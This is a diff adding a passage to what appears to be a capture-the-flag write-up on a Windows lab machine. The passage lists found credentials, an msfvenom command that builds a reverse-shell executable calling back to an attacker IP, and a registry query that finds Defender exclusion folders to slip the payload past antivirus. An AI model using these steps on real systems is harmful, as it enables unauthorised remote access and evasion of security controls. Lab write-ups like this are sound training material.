@@ -154,4 +154,53 @@ JMorgan
 LHopkins
 ```
 
+- The working creds are `EDavies:Password1!`
+
+![](./images/4.png)
+
+![](./images/5.png)
+
+- Let's upgrade from webshell to reverse shell
+  - Generate a payload using `msfvenom` and upload it to box
+```
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LPORT=6666 LHOST=10.10.16.9 -f exe -o rev.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+
+```
+
+- But the shell doesn't work due to `Defender`
+
+![](./images/6.png)
+
+- We can check if there are any exclusion folders in `Defender` 
+
+```
+PS C:\Users\edavies\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+
+    C:\Utils    REG_DWORD    0x0
+    C:\Windows\System32    REG_DWORD    0x0
+```
+
+- Run the payload
+
+![](./images/7.png)
+
+- Suddenly, the shell closes
+  - So I tried with the `nc` 
+  - But it closes too
+
+![](./images/9.png)
+
+![](./images/8.png)
+
+- I would probably have to try `meterpreter` and migrate to another process
+
+
 ## User
